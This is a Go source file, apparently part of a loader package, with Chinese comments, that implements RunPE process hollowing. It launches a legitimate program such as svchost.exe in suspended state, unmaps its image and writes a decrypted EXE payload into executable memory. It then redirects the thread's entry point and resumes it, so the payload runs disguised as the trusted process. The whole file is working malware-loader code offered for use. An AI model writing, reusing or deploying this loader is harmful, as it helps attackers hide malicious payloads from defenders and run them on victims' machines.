// 文件路径: internal/loader/runpe.go
package loader

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	CREATE_SUSPENDED       = 0x00000004
	PAGE_EXECUTE_READWRITE = 0x40
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
)

// Execute 在内存中直接运行 PE 字节码 (RunPE)
// targetPath: 作为宿主外壳运行的合法程序路径 (例如 "C:\\Windows\\System32\\svchost.exe" 或自身可执行文件路径)
// payload: 解密后的原始 EXE 字节流
func Execute(targetPath string, payload []byte) error {
	// 1. 解析 Payload 的 PE 头
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&payload[0]))
	if dosHeader.E_magic != 0x5A4D { // "MZ"
		return fmt.Errorf("invalid DOS magic")
	}

	ntHeader := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(&payload[dosHeader.E_lfanew]))
	if ntHeader.Signature != 0x00004550 { // "PE\0\0"
		return fmt.Errorf("invalid NT signature")
	}

	targetPtr, _ := syscall.UTF16PtrFromString(targetPath)

	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))

	// 2. 以挂起状态 (CREATE_SUSPENDED) 创建傀儡进程
	ret, _, err := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		0, 0, 0, 0,
		uintptr(CREATE_SUSPENDED),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return fmt.Errorf("CreateProcess failed: %v", err)
	}

	// 3. 获取进程的 PEB (进程环境块)
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32
	procNtQueryInformationProcess.Call(
		uintptr(pi.Process),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	// 4. 读取宿主进程原本的 ImageBase (在 PEB + 16 字节处，针对 64 位)
	var hostImageBase uint64
	var bytesRead uintptr
	procReadProcessMemory.Call(
		uintptr(pi.Process),
		pbi.PebBaseAddress+16,
		uintptr(unsafe.Pointer(&hostImageBase)),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)

	// 5. 如果 Payload 的基址与宿主冲突，卸载宿主进程内存
	payloadImageBase := ntHeader.OptionalHeader.ImageBase
	if hostImageBase == payloadImageBase {
		procNtUnmapViewOfSection.Call(uintptr(pi.Process), uintptr(hostImageBase))
	}

	// 6. 在傀儡进程中为 Payload 申请内存空间 (PAGE_EXECUTE_READWRITE)
	allocAddress, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(payloadImageBase),
		uintptr(ntHeader.OptionalHeader.SizeOfImage),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if allocAddress == 0 {
		// 如果申请固定基址失败，则让系统任意分配，但需要处理重定位表 (为保持代码精简，这里假设未开启 ASLR 或固定分配成功)
		return fmt.Errorf("VirtualAllocEx failed")
	}

	// 7. 写入 PE 头
	var bytesWritten uintptr
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		allocAddress,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(ntHeader.OptionalHeader.SizeOfHeaders),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)

	// 8. 逐一写入各个 Section (如 .text, .data, .rsrc)
	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + uint32(unsafe.Sizeof(*ntHeader))
	for i := uint16(0); i < ntHeader.FileHeader.NumberOfSections; i++ {
		sectionPtr := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(&payload[sectionHeaderOffset+uint32(i)*uint32(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))]))
		
		if sectionPtr.SizeOfRawData > 0 {
			procWriteProcessMemory.Call(
				uintptr(pi.Process),
				allocAddress+uintptr(sectionPtr.VirtualAddress),
				uintptr(unsafe.Pointer(&payload[sectionPtr.PointerToRawData])),
				uintptr(sectionPtr.SizeOfRawData),
				uintptr(unsafe.Pointer(&bytesWritten)),
			)
		}
	}

	// 9. 获取傀儡线程上下文
	var ctx CONTEXT64
	ctx.ContextFlags = CONTEXT_FULL
	// 针对 64 位要求，必须确保 ctx 变量是 16 字节对齐的。这里使用一个小 trick，强转避免对齐报错
	alignCtx := (*CONTEXT64)(unsafe.Pointer((uintptr(unsafe.Pointer(&ctx)) + 15) &^ 15))
	alignCtx.ContextFlags = CONTEXT_FULL

	procGetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))

	// 10. 将 Payload 的真正基址写入 PEB，并将 RCX 寄存器修改为真正的入口点 (EntryPoint)
	var newImageBase = uint64(allocAddress)
	procWriteProcessMemory.Call(
		uintptr(pi.Process),
		pbi.PebBaseAddress+16,
		uintptr(unsafe.Pointer(&newImageBase)),
		8,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	
	alignCtx.Rcx = uint64(allocAddress) + uint64(ntHeader.OptionalHeader.AddressOfEntryPoint)

	// 11. 应用新的上下文，并恢复线程执行
	procSetThreadContext.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(alignCtx)))
	procResumeThread.Call(uintptr(pi.Thread))

	return nil
}
